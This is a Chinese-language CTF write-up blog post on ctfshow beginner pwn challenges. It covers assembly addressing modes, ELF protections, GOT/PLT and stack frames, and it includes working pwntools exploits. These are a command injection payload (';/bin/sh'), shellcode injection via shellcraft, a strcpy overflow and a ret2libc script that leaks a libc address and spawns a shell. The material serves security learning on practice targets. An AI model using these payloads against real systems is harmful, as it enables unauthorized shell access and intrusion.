---
title: '前置基础'
date: 2026-03-30 17:04:30 +0800
categories:
  - ctf刷题
  - pwn刷题
tags:
  - ctfshow
  - 前置基础
---
## 前置基础

这一部分来了解一下汇编的知识

我理解的寄存器就是类似于编程语言的“变量”，但是他们不同于内存的“值”，而是少数几个在CPU中参与的“施工工具”



### pwn5

运行文件后的输出为？

```asm
section .data
    msg db "Welcome_to_CTFshow_PWN", 0		; 定义了一个字符串常量，它的首地址被标记为 msg

section .text
    global _start

_start:
; 输出字符串
    mov eax, 4          ; 系统调用号4代表输出字符串
    mov ebx, 1          ; 文件描述符1代表标准输出
    mov ecx, msg        ; 要输出的字符串的地址
    mov edx, 22         ; 要输出的字符串的长度
    int 0x80            ; 调用系统调用

; 退出程序
    mov eax, 1          ; 系统调用号1代表退出程序
    xor ebx, ebx        ; 返回值为0
    int 0x80            ; 调用系统调用
```

**执行过程如下：**

1. **暂停：** CPU 看到 `int 0x80`，会立刻放下手头的活，保存当前的施工现场。
2. **切换：** CPU 从“用户态”（权限受限）切换到“内核态”（最高权限）。
3. **查找：** 内核查看 `eax`，哦，是 `4` 号业务（写文件）。
4. **施工：** 内核查看 `ebx`, `ecx`, `edx`，知道要把内存地址 `msg` 处的 22 个字节送到屏幕上。
5. **返回：** 活干完了，内核把控制权还给你的程序，程序继续执行下一行。



这里再补充一下怎么使用 NASM 汇编器和 ld 链接器编译成可执行文件。

首先，将代码保存为一个文件，例如 Welcome_CTFshow.asm 。然后，使用以下命令将其编译为对象文件：

```bash
nasm -f elf Welcome_to_CTFshow.asm
```

这将生成一个名为 Welcome_CTFshow.o 的对象文件。接下来，使用以下命令将对象文件链接成可执行文件：

```bash
ld -m elf_i386 -s -o Welcome_to_CTFshow Welcome_to_CTFshow.o
```





### pwn6

立即寻址方式结束后eax寄存器的值为？

```asm
; 立即寻址方式
    mov eax, 11         ; 将11赋值给eax
    add eax, 114504     ; eax加上114504
    sub eax, 1          ; eax减去1
```

11+114501-1=114514





### pwn7

寄存器寻址方式结束后edx寄存器的值为？

```asm
; 寄存器寻址方式
    mov ebx, 0x36d      ; 将0x36d赋值给ebx
    mov edx, ebx        ; 将ebx的值赋值给edx
```

先把值复制给一个寄存器，再把这个寄存器的值复制给另一个寄存器





### pwn8

直接寻址方式结束后ecx寄存器的值为？

```asm
; 直接寻址方式
    mov ecx, msg      ; 将msg的地址赋值给ecx
```

这个地方我们直接看汇编是看不出来的，因为我们不知道这个程序在运行的时候，这个 msg 的地址到底在哪里

![image-20260327165623071](/assets/img/posts/pwn-basics/image-20260327165623071.png)

找到这一行汇编，可以看到，汇编里写的是 msg，这里是 offset dword_80490E8

offset 代表的是取地址，dword 意思是 ida 识别到 80490E8 这个地方是一个四字节的字符，具体的值就是 636C6557h

![image-20260327165551224](/assets/img/posts/pwn-basics/image-20260327165551224.png)

这里有个小小的特性，ida会认为“地址”就代表了从这个点开始往后的所有内容



### pwn9

寄存器间接寻址方式结束后eax寄存器的值为？

```asm
; 寄存器间接寻址方式
    mov esi, msg        ; 将msg的地址赋值给esi
    mov eax, [esi]      ; 将esi所指向的地址的值赋值给eax
```

很简单，就是先把一个地址的值赋值给 esi，在把 esi 此时指向的值赋值给 eax

具体的值见上题目，就是 636C6557h





### pwn10

寄存器相对寻址方式结束后eax寄存器的值为？

```asm
; 寄存器相对寻址方式
    mov ecx, msg        ; 将msg的地址赋值给ecx
    add ecx, 4          ; 将ecx加上4
    mov eax, [ecx]      ; 将ecx所指向的地址的值赋值给eax
```

同理，把地址取出来加4，再把新地址对应的值赋值，新地址为 080490EC

![image-20260327170806971](/assets/img/posts/pwn-basics/image-20260327170806971.png)

所以我认为这道题的答案应该是 ctfshow{0x5F656D6F}，而不是 ctfshow{ome_to_CTFshow_PWN}，毕竟32位寄存器只能存四字节，哪里放得下那么多呢





### pwn11

基址变址寻址方式结束后的eax寄存器的值为？

```asm
; 基址变址寻址方式
    mov ecx, msg        ; 将msg的地址赋值给ecx
    mov edx, 2          ; 将2赋值给edx
    mov eax, [ecx + edx*2]  ; 将ecx+edx*2所指向的地址的值赋值给eax
```

把 msg 的地址作为基地址，在此基础上做运算取值后再赋值

080490E8+2*2=0X80490EC





### pwn12

相对基址变址寻址方式结束后eax寄存器的值为？

```asm
; 相对基址变址寻址方式
    mov ecx, msg        ; 将msg的地址赋值给ecx
    mov edx, 1          ; 将1赋值给edx
    add ecx, 8          ; 将ecx加上8
    mov eax, [ecx + edx*2 - 6]  ; 将ecx+edx*2-6所指向的地址的值赋值给eax
```

没什么区别

(080490E8+8)+1*2-6=0X80490EC





### pwn13

C 我还是有那么一丢丢基础的，简单来说就是声明了一个数组，存放了一堆字符的 ASCI，pringf() 来输出

![image-20260327172336503](/assets/img/posts/pwn-basics/image-20260327172336503.png)

```bash
gcc flag.c -o flag
```





### pwn14

好吧，当我没说，copy 一下

程序打开名为 "key" 的文件，以二进制（"rb"）模式进行读取。如果文件打开失败，将输出错误消息 "Nothing here!" 并返回 -1。

然后，程序定义了一个缓冲区 buffer 用于读取文件内容，以及一个字符串数组 output 用于存储转换后的二进制字符串。变量 offset 用于跟踪 output 数组中的偏移量。

接下来，程序开始将输出字符串初始化为 "ctfshow{"，然后进入一个循环，每次读取BUFFER_SIZE 字节的数据到 buffer 中，并将其转换为二进制字符串形式。

在内层循环中，程序遍历当前读取的字节的每一位，从最高位到最低位。通过右移操作和位与运算，提取出每一位的值，并使用 sprintf 函数将其添加到 output 字符串中。

在每个字节的二进制表示结束后，如果当前字节不是最后一个字节，则在 output 字符串中添加下
划线作为分隔符。

如果文件还未读取完毕（即文件结束符未被读取），则在 output 字符串中添加空格作为分隔符。循环结束后，程序在 output 字符串中添加 "}"，表示结束标记，并使用 printf 函数将最终的转换结果打印出来。

最后，程序关闭文件，并返回 0 表示成功执行。

该程序的作用是将二进制文件中的内容转换为二进制字符串形式，并以特定格式输出。

![image-20260327173410284](/assets/img/posts/pwn-basics/image-20260327173410284-1774604060274-1.png)

```bash
cat <<EOF > key
CTFshow
EOF

gcc flag.c -o flag

./flag
```





### pwn15

这个就很简单了，分别读了几次字符串

![image-20260327173818710](/assets/img/posts/pwn-basics/image-20260327173818710.png)

```bash
nasm -f elf flag.asm
ld -m elf_i386 -s -o flag flag.o
```





### pwn16

太复杂了，懒得看，反正 gcc 编译即可

![image-20260327174347658](/assets/img/posts/pwn-basics/image-20260327174347658.png)





### pwn17

挺有意思的，看起来我们应该输入3，然后等待sleep去读flag，但是得等114514秒

能注意到，2也会执行命令，而且 dest 是可以控制的

初始化的时候，dest默认是 `ls/` ，但是 read() 函数允许从键盘输入10字节大小到 buf 中，然后 strcat() 进行拼接

所以我们只需要输入路径的时候输入 `;/bin/sh` 来获得一个 shell 就可以了，同理， `;cat /f*` 也可以

![image-20260327180015874](/assets/img/posts/pwn-basics/image-20260327180015874.png)

尝试编写的我的第二个exploit.py，也是我第一个不依赖ai的exp，还是很有成就感的

```python
from pwn import *

io = remote("pwn.challenge.ctf.show", 28302)

io.recvuntil(b"\nHow much do you know about Linux commands? \n")
io.sendline(b"2")

io.recvuntil(b"Which directory?('/','./' or the directiry you want?)")
payload = b";/bin/sh"
io.sendline(payload)

io.interactive()
```

![image-20260327181409580](/assets/img/posts/pwn-basics/image-20260327181409580.png)





### pwn18

也是很简单的一道题，两个函数都是去写flag，real() 函数用的是 `>` ，而 fake() 函数用的是 `>>` 

前者是覆盖，而后者是追加，为了读到真实的flag，我们需要追加而不是覆盖，所以只需要输入9就行了

![image-20260327181811972](/assets/img/posts/pwn-basics/image-20260327181811972.png)

```python
from pwn import *

io = remote("pwn.challenge.ctf.show", 28305)

io.recvuntil(b"Which is the real flag?")
io.sendline(b"9")

print(io.recvall().decode())	# 接收剩下的所有输出，看看 cat 出来的结果
```

![image-20260327191421478](/assets/img/posts/pwn-basics/image-20260327191421478.png)





### pwn19

关键就在这一句 `fclose(_bss_start);` ，_bss_start 是标准输出，关掉了就没有回显了，但是你只要乱打一些东西就会发现，标准错误没有关掉，所以我们只需要把输出重定向到标准错误 `>&2` 就可以了，同样的，重定向到标准输入也可以 `>&0`

其实这么想很简单，就是输入完命令以后的回显没有了，但是shell有三个显示方式，一个是键盘敲的内容，一个是正常反馈，还有一个是报错的反馈，只要让正常反馈通过输入内容或者报错反馈的方式显示出来就行

![image-20260327184517544](/assets/img/posts/pwn-basics/image-20260327184517544.png)

```python
from pwn import *

io = remote("pwn.challenge.ctf.show", 28154)

io.recvuntil(b"give you a shell! now you need to get flag!")
io.sendline(b"cat /ctfshow_flag >&2")	#注意重定向符号是一个整体

print(io.recvall().decode())
```

![image-20260327190130445](/assets/img/posts/pwn-basics/image-20260327190130445.png)

```python
from pwn import *

io = remote("pwn.challenge.ctf.show", 28154)

io.recvuntil(b"give you a shell! now you need to get flag!")
io.sendline(b"cat /ctfshow_flag >&2")	#注意重定向符号是一个整体

print(io.recvall().decode())
```

![image-20260327190428441](/assets/img/posts/pwn-basics/image-20260327190428441.png)





### pwn20

#### 题目：

提交ctfshow{【.got表与.got.plt是否可写(可写为1，不可写为0)】,【.got的地址】,【.got.plt的地址】}

例如 .got可写.got.plt表可写其地址为0x400820 0x8208820

最终flag为ctfshow{1_1_0x400820_0x8208820}

若某个表不存在，则无需写其对应地址

如不存在.got.plt表，则最终flag值为ctfshow{1_0_0x400820}



#### 解析：

从这里开始，我们不能上来就 ida 了，必须先 checksec 一下，有点类似做 re 先丢 die

```
╰─ checksec pwn
[*] '/home/scdyh/pwn/pwn'
    Arch:       amd64-64-little
    RELRO:      No RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```

那我们先把这几个参数的意思给弄懂

| **参数**     | **全称**                            | **作用 (白话解释)**                                          | **状态对 Pwn 的影响**                                        |
| ------------ | ----------------------------------- | ------------------------------------------------------------ | ------------------------------------------------------------ |
| **RELRO**    | **Re-location Read-Only**           | **重定位只读**。保护全局偏移表 `.got` 和过程链接表 `.got.plt` 不被篡改。 | **No RELRO** : 我们可以随意修改函数地址（GOT 表劫持）。<br />Partial RELRO：在这种状态下，GOT的开头部分被设置为只读（RO）。<br />Full RELRO：在这种状态下，GOT和PLT都被设置为只读（RO）。 |
| **Stack**    | **Canary**                          | **栈金丝雀**。在返回地址前放个哨兵。                         | **No canary found**: 只要有 `read` 或 `gets` 溢出，直接覆盖返回地址就能拿 Shell。 |
| **NX**       | **No-Execute**                      | **堆栈不可执行**。                                           | **NX enabled**: 你不能在栈上跑 Shellcode。必须用 ROP。       |
| **PIE**      | **Position Independent Executable** | **地址随机化**。                                             | **No PIE**: 程序基址固定为 `0x400000`。你在 IDA 看到的地址就是真实的，直接用！ |
| **Stripped** | **符号表剥离**                      | **是否去除了函数名**。                                       | **No**: IDA 里能看到 `main`, `system` 等名字。如果是 **Yes**，你只能看到 `sub_400520` 这种代号。 |

那到底什么是 got 呢？为了让程序调用外部函数（如 `printf`），Linux 使用了延迟绑定技术。

- **`.got` (Global Offset Table)**：全局偏移表。通常存放**全局变量**的地址。
- **`.got.plt`**：专门存放**外部函数**（动态链接库函数）的地址。

什么意思呢，比如一个程序在运行的时候需要调用 printf() 函数，但是这并不是官方的函数，而是需要一个 libc 的插件

问题是这个插件每次加载的时候在内存的位置都不固定，所以我们需要类似目录一样的 “表” ，让程序读 “表项” 来查找地址，为什么会有漏洞呢，比如我可以改掉这个类似目录的东西，比如把 printf() 那一条改成 system()，这样程序确实去找 printf() 的地址，返回的确是 system()，实际调用的也就被劫持了

怎么查看程序的表项呢？

- 在 ida 里，我们用快捷键 `shift + f7` ，打开 Segment

![image-20260329161347655](/assets/img/posts/pwn-basics/image-20260329161347655.png)

双击一下对应的表，我们能看到具体的表项

![image-20260329162332363](/assets/img/posts/pwn-basics/image-20260329162332363.png)

- 在命令行中，使用命令 readelf

```bash
readelf -S pwn
```

![image-20260329162032919](/assets/img/posts/pwn-basics/image-20260329162032919.png)



#### 答案：

ctfshow{1_1_0x600f18_0x600f28}





### pwn21

#### 题目：

提交ctfshow{【.got表与.got.plt是否可写(可写为1，不可写为0)】,【.got的地址】,【.got.plt的地址】}

例如 .got可写.got.plt表可写其地址为0x400820 0x8208820

最终flag为ctfshow{1_1_0x400820_0x8208820}

若某个表不存在，则无需写其对应地址

如不存在.got.plt表，则最终flag值为ctfshow{1_0_0x400820}



#### 分析：

这一次很明显不一样了，变成了 RELRO 部分保护

![image-20260329163042009](/assets/img/posts/pwn-basics/image-20260329163042009.png)

但是再去看就会感觉很奇怪，为什么 ida 里，两张表还是可写呢

![image-20260329163400663](/assets/img/posts/pwn-basics/image-20260329163400663.png)

**静态文件视角（IDA/readelf）**： 在磁盘上的 ELF 文件里，`.got` 段的属性确实被标记为 `WA` (Write/Alloc)，即可写。因为操作系统在加载程序时，需要先往里填入初始地址。

**动态运行视角（checksec/内核）**： 当程序运行起来后，加载器（ld.so）会执行一个动作：把 `.got` 段那一块内存的权限从 `R/W` 改成 `R`。

```bash
readelf -l pwn 
```

能看到有一个 `GNU_RELRO` 段，它的作用是在程序开始运行后，会将 `0x600e10` 到 `0x601000` 这一块区域全部设为 **R（只读）**

而 .got 在这个范围内，所以变成了只读，而 .got.plt 恰好在结束的边界上，所以依旧可写

![image-20260329163701165](/assets/img/posts/pwn-basics/image-20260329163701165.png)



#### 答案：

ctfshow{0_1_0x600ff0_0x601000}





### pwn22

#### 题目：

提交ctfshow{【.got表与.got.plt是否可写(可写为1，不可写为0)】,【.got的地址】,【.got.plt的地址】}

例如 .got可写.got.plt表可写其地址为0x400820 0x8208820

最终flag为ctfshow{1_1_0x400820_0x8208820}

若某个表不存在，则无需写其对应地址

如不存在.got.plt表，则最终flag值为ctfshow{1_0_0x400820}



#### 分析：

完全保护，而且连 .plt 都没有了

![image-20260329164452412](/assets/img/posts/pwn-basics/image-20260329164452412.png)



#### 答案：

ctfshow{0_0_0x600fc0}





### pwn23

#### 题目：

用户名为 ctfshow 密码 为 123456 请使用 ssh软件连接



#### 分析：

很明显能看到，没有权限读 flag ，但是我们的 pwnme 程序有s权限

![image-20260329165519624](/assets/img/posts/pwn-basics/image-20260329165519624.png)

ida 看一下

![image-20260330095603746](/assets/img/posts/pwn-basics/image-20260330095603746.png)

前面比较好理解，fopen() 可以读 /ctfshow_flag，流 stream 保存的是这个文件的指针，fgets() 相当于把指针指向的文件内容保存到 flag 数组里，所以总而言之，现在内存里有一个数组 flag，内容就是 /ctfshow_flag，问题就在于怎么读这个数组呢

看到后面 argc 和 argv ，argc 指的是命令行的参数数量，argv 是一个数组，argv[1] 放的就是你输入的第一个参数，如果我们

```
./pwnme AAA
```

就会有

```
ctfshow(AAA)
```

而这道题的漏洞点就在于 ctfshow() 里的 strcpy()

![image-20260330095616330](/assets/img/posts/pwn-basics/image-20260330095616330-1774837162937-3.png)

strcpy(dest, src) 是一个很暴力的函数，程序里头个 dest 数组声明了一个58字节的长度，但是 strcpy() 不检查，它只会暴力地把 src 的内容暴力地放到 dest，所以我们命令行参数输入地足够长，就会把 dest 给“撑爆”，实现缓冲区栈溢出。

基于循序渐进的原则，我们先不去理解什么是栈溢出，只需要直到这时候程序崩溃了

![image-20260330101846553](/assets/img/posts/pwn-basics/image-20260330101846553.png)

那我们是怎么读到 flag 的呢，这是程序在前面提前注册了一个 signal()，当程序识别到栈溢出的时候，会触发 sigsegv_handler() 函数，这样就把 flag 给读出来了。当然这道题比较简陋，只是演示一下 No canary found 下的缓冲区栈溢出

所以我们只需要在输入命令行参数的时候带着一大串字符串，就可以读到flag 了





### pwn24

#### 题目：

你可以使用pwntools的shellcraft模块来进行攻击



#### 分析：

还是先 checksec，发现32位仅部分开启RELRO保护，看到存在一个RWX权限的段，即可读可写可执行的段

```
╰─ checksec pwn
[*] '/home/scdyh/pwn/pwn'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x8048000)
    Stack:      Executable
    RWX:        Has RWX segments
    Stripped:   No
```

丢到ida里可以发现就一个 ctfshow() 函数，还反编译不了，这是因为中间有一个 `call    eax` ，很明显 eax 这个寄存器要运行起来才有东西

![image-20260330103428048](/assets/img/posts/pwn-basics/image-20260330103428048.png)

我们先一点一点来看汇编，这里我们先理解栈的基本情况

```asm
; int __cdecl ctfshow(_DWORD)
public ctfshow
ctfshow proc near

buf= byte ptr -88h
var_4= dword ptr -4
```

开头部分，也是声明部分，简单来说，就是函数声明了栈上的两个局部变量，一个大一点的 buf 和一个小一点的 var_4



第一组，函数搭栈帧

```asm
push    ebp
mov     ebp, esp
push    ebx
sub     esp, 84h
```

这里出现了一个 ebp 和 esp 两个新的寄存器，是前面我们没了解到的，介绍一下，注意这里栈是从高地址往低地址写的，所以这是一栋在往下面建的楼

| 寄存器 | 作用                 |
| ------ | -------------------- |
| eax    | 通用（经常放返回值） |
| ebx    | 通用                 |
| ecx    | 通用                 |
| edx    | 通用                 |
| esp    | 指向栈顶             |
| ebp    | 指向当前函数的基准点 |

比如：

```asm
push eax
```

发生的事情是：

1. esp -= 4（因为 eax 是四个字节，相当于把位置让出来）
2. 把 eax 的值放到 [esp]

而一个函数运行的时候 ebp 是不变的，好像一个大厦的地基，我们只在楼顶进行装修

那这道题是怎么搭栈帧的呢

第一步：

```asm
push ebp
```

把“上一个函数的 ebp”保存起来，意思是这栋楼盖用完了的话，我们要方便找到上一栋楼的地基在哪里

第二步：

```asm
mov ebp, esp
```

让当前函数的 ebp = 当前栈顶，相当于把地基移动到了上一栋楼的楼顶

从这一刻开始，ebp 就是这个函数的“坐标原点”

第三步：

```asm
sub esp, 84h
```

让栈顶往下挖一块0x84字节的空间，给新的局部变量用，相当于开始盖新的楼了

刚好加上留给上一个函数的 ebp 的四个字节，一共0x88字节，对应前面声明的栈的空间



第二组，PIC 相关，先不深究，我们先简单理解为“编译器自动做的地址准备工作”

```
call    __x86_get_pc_thunk_bx
add     ebx, (offset _GLOBAL_OFFSET_TABLE_ - $)
```



第三组，调用 `read`

```asm
sub     esp, 4
push    100h            ; nbytes
lea     eax, [ebp+buf]
push    eax             ; buf
push    0               ; fd
call    _read
add     esp, 10h
```

先说 `read` 的原型，对应的是从哪个文件描述符读，读到哪里，最多读多少字节：

```c
read(fd, buf, nbytes)
```

一步一步看 read 的实现还是太复杂了，我们先简化成 read 从键盘读最多0x100字节到 buf 里

```cc
read(0, buf, 0x100);
```



第四组，调用 `put`

```asm
sub     esp, 0Ch
lea     eax, [ebp+buf]
push    eax             ; s
call    _puts
add     esp, 10h
```

先说 `puts` 的原型，就是打印一个字符串

```c
puts(s)
```

同样，我们这里先简化成 puts 在打印 buf

```c
puts(buf);
```



第五组，也是最关键的一组，call 调用

```asm
lea     eax, [ebp+buf]
call    eax
```

把 `buf` 的地址放进 `eax` 后，直接调用了 eax，也就是说，程序会跑到 buf 的部分去执行，也就是说，输入的内容变成了函数执行的内容



第六组：函数收尾

```asm
nop
mov     ebx, [ebp+var_4]	; 恢复之前保存的 ebx
leave						; 把栈顶恢复到函数刚建立栈帧时的位置并且恢复上一个函数的 ebp
retn
```



总体看完了，我们来回顾一下，如果编译成c，大概就是

从标准输入读最多 `0x100` 字节到 `buf`
把 `buf` 当字符串打印出来
再把 `buf` 当代码地址去调用

```c
void ctfshow() {
    char buf[0x88];

    read(0, buf, 0x100);
    puts(buf);
    ((void(*)())buf)();
}
```

看到这里也很显而易见了，就在于你输入的东西会被调用执行，但是 call 执行的是机器码，所以我们得输入 shellcode（能获得一个shell的机器指令）

这里我们使用 pwntools 的 shellcraft 模块来进行攻击

exp

```python
from pwn import *
io = remote("pwn.challenge.ctf.show", 28196)

print(shellcraft.sh())
payload = asm(shellcraft.sh())
io.sendline(payload)

io.interactive()
```

可以看到，上面那段就是生成的汇编代码模板，下面那部分就是真正的机器码

![image-20260330115228784](/assets/img/posts/pwn-basics/image-20260330115228784.png)





### pwn25

#### 题目：

开启NX保护，或许可以试试ret2libc



#### 分析：

32位开启NX保护，也就是说现在栈上不能执行代码了，同时部分开启RELRO保护

```
╰─ checksec pwn
[*] '/home/scdyh/pwn/pwn'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    Stripped:   No
```

题目提示试试 ret2libc，是什么意思呢

Linux 程序几乎都会链接 libc，而 libc 里面有很多现成函数，比如：

- `system`（最常用来构造 `system("/bin/sh")` 来获得一个shell）
- `puts`
- `read`
- `write`

而正常函数结束时会执行：

```asm
leave
retn
```

`ret` 会从拿栈顶 4 字节，当成跳转目标。

平时这个地址应该是“回到调用者”的地址。但如果你溢出了，就能把这个地址改掉，比如让它返回到 `system("/bin/sh")`

这就叫 ret2libc（return to libc）

也就是：**把返回地址改成 libc 里的函数地址。**

如果我们能控制栈的内容来打 ret2libc，就需要构造这么一个结构来伪造一次函数调用，让程序帮我们执行 system("/bin/sh")

```
高地址
-----------------
buf padding
-----------------
system() 地址     ← 覆盖返回地址，让当前函数返回到 system()
-----------------
return 地址       ← system 执行完跳这里
-----------------
"/bin/sh" 地址    ← system 的参数，获得一个 shell
-----------------
低地址
```

那这个覆盖过程大概是怎么样的呢

![image-20260330152257816](/assets/img/posts/pwn-basics/image-20260330152257816.png)

```asm
_BYTE buf[132];   // ebp-0x88
read(0, buf, 0x100);
```

意思是：

- `buf` 从 `[ebp-0x88]` 开始
- 只有 `0x88 = 136` 字节空间附近
- 但 `read` 最多读 `0x100 = 256` 字节

所以如果我们输入太长，数据会这样一路往上覆盖：

```
[ebp-0x88]   buf开始
↓
[ebp-4]      局部变量/保存寄存器
↓
[ebp]        旧 ebp
↓
[ebp+4]      返回地址（比如改成system的地址）
```



现在我们要开始构造 payload

```python
padding 		# 把前面的 buf 填满，一直填到返回地址的位置
system_addr		# 覆盖原来的返回地址，让函数 ret 时跳到 system()
fake_ret		# 给 system 函数准备一个假的返回地址，不严谨的话填跳到哪都行，最好是 exit
binsh_addr		# 作为 system() 的参数。
```

需要核心的三样东西

1. offset，填充的长度
2. system() 的地址
3. "/bin/sh" 的地址

先看 offset，buf 0x88字节，+4就能到返回地址，所以 offset = 0x88 + 4

再看 system() 地址，很明显，程序里并没有直接调用 system()，但是调用了和 system() 在同一个 libc 的 write()，而同一个 libc 里，各个符号的相对偏移是固定的。

所以我们可以以 write() 作为参照，先获得 write() 的真实地址，再去找 system() 的真实地址

我们需要先让函数跳转到调用 write() 的入口，并且告诉它返回到主函数（因为我们需要再利用一次来发利用的payload），实际上去执行 write(1, write_got, 4); 也就是把 write 的真实地址先泄露出来

然后利用 write() 的地址，让 LibcSearcher 去查找这个 libc 的版本，然后用 write 的偏移求得 libc 的基地址

计算出 system() 和 "/bin/sh" 的地址，发送构造好的 system("/bin/sh")

怎么说呢，cursor这些ide的补全功能还是太强大了，为了加深影响，还是用vi手写一遍吧

exp

```python
from pwn import *
from LibcSearcher import *

io = remote("pwn.challenge.ctf.show", 28302)
elf = ELF("./pwn")

offset = 0x88 + 4
main_addr = elf.sym["main"]
write_plt = elf.plt["write"]
write_got = elf.got["write"]

# stage 1:
payload = b"a" * offset + p32(write_plt) + p32(main_addr) + p32(1) + p32(write_got) + p32(4)
io.clean()
io.sendline(payload)

write_addr = u32(io.recv(4))

# 这里没有给，所以需要搜索版本再计算
# libc = ELF("./libc.so.6")
libc = LibcSearcher("write",write_addr)
libc_base = write_addr - libc.dump("write")
system_addr = libc_base + libc.dump("system")
binsh_addr = libc_base + libc.dump("str_bin_sh")

# stage 2:
payload = b"a" * offset + p32(system_addr) + p32(main_addr) + p32(binsh_addr)
io.sendline(payload)

io.interactive()
```

这里由于不同版本的偏移量有可能一样，所以得选一下，如果可以的话可以多弄两个函数的地址进去，比如 read()

![image-20260330164619708](/assets/img/posts/pwn-basics/image-20260330164619708.png)






